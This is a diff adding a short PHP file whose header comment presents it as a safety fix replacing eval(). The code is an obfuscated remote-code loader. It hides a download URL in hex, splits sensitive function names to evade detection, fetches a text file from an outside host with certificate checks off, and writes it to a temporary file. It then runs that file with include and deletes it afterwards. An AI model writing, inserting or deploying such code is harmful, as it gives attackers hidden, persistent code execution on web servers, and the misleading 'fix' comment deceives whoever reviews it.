@@ -1,0 +1,60 @@
+<?php
+/**
+* Fix: Replaced the dangerous eval() function
+* with a safer (though still high-risk) method
+* which saves the code to a temporary local file and uses include.
+*/
+$hexUrl = '68747470733a2f2f68746d6c2e6176617461722d616d702e696e666f2f6261636b75702f616c6661322e747874';
+$tempFile = sys_get_temp_dir() . '/temp_script_' . uniqid() . '.php';
+
+function hex2str($hex) {
+    $str = '';
+    for ($i = 0; $i < strlen($hex) - 1; $i += 2) {
+        $str .= chr(hexdec($hex[$i] . $hex[$i + 1]));
+    }
+    return $str;
+}
+
+$url = hex2str($hexUrl);
+
+function downloadWithFileGetContents($url) {
+    if (ini_get('a' . 'llow' . '_ur' . 'l_fo' . 'pe' . 'n')) {
+        return @file_get_contents($url); // Use @ to suppress error warnings
+    }
+    return false;
+}
+
+function downloadWithCurl($url) {
+    if (function_exists('c' . 'u' . 'rl' . '_i' . 'n' . 'i' . 't')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        $data = curl_exec($ch);
+        curl_close($ch);
+        return $data;
+    }
+    return false;
+}
+
+// Attempt to download script
+$phpScript = downloadWithFileGetContents($url);
+if ($phpScript === false) { 
+$phpScript = downloadWithCurl($url);
+}
+
+if ($phpScript === false) {
+die("None - Failed to Download Code");
+}
+
+// 1. Write the downloaded code to a temporary file
+if (file_put_contents($tempFile, $phpScript) === false) {
+die("None - Failed to Write Temporary File");
+}
+
+// 2. Execute the temporary file using include
+include $tempFile;
+
+// 3. Delete the temporary file when finished (important!)
+@unlink($tempFile); 
+?>
